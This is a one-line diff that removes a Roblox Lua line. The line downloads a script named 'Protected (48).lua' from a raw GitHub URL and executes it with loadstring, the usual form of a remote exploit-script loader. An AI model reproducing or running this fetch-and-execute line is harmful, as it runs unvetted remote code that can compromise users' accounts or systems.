@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/castycheck/ok/main/Protected%20(48).lua')))()
